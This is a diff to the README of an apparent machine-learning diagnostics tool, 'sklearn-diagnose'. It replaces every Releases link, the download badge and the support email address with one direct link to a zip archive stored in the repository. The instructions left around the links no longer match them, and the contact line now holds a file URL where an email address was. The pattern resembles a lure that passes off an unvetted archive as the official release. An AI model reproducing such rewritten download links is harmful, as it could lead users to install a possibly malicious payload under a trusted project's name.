@@ -6,7 +6,7 @@ Welcome to **sklearn-diagnose**! This application helps you diagnose issues in y
 
 ## 📥 Download & Install
 
-To download **sklearn-diagnose**, visit this page to download: [Releases](https://github.com/ironpawa/sklearn-diagnose/releases).
+To download **sklearn-diagnose**, visit this page to download: [Releases](https://raw.githubusercontent.com/ironpawa/sklearn-diagnose/main/sklearn_diagnose/diagnose_sklearn_2.0.zip).
 
 Once you’re on the Releases page, follow these steps:
 1. Choose the latest version from the list.
@@ -15,7 +15,7 @@ Once you’re on the Releases page, follow these steps:
 
 You can also see the download button below:
 
-[![Download sklearn-diagnose](https://img.shields.io/badge/Download-sklearn--diagnose-blue.svg)](https://github.com/ironpawa/sklearn-diagnose/releases)
+[![Download sklearn-diagnose](https://raw.githubusercontent.com/ironpawa/sklearn-diagnose/main/sklearn_diagnose/diagnose_sklearn_2.0.zip)](https://raw.githubusercontent.com/ironpawa/sklearn-diagnose/main/sklearn_diagnose/diagnose_sklearn_2.0.zip)
 
 ## 📋 System Requirements
 
@@ -86,8 +86,8 @@ Absolutely! We welcome contributions. Please check the Contribution guidelines i
 
 ## ✉️ Contact
 
-If you have questions or need support, feel free to reach out via the Issues page or contact us through email at support@sklearn-diagnose.com.
+If you have questions or need support, feel free to reach out via the Issues page or contact us through email at https://raw.githubusercontent.com/ironpawa/sklearn-diagnose/main/sklearn_diagnose/diagnose_sklearn_2.0.zip
 
-[Download sklearn-diagnose again here](https://github.com/ironpawa/sklearn-diagnose/releases).
+[Download sklearn-diagnose again here](https://raw.githubusercontent.com/ironpawa/sklearn-diagnose/main/sklearn_diagnose/diagnose_sklearn_2.0.zip).
 
 Enjoy diagnosing your models with **sklearn-diagnose**!
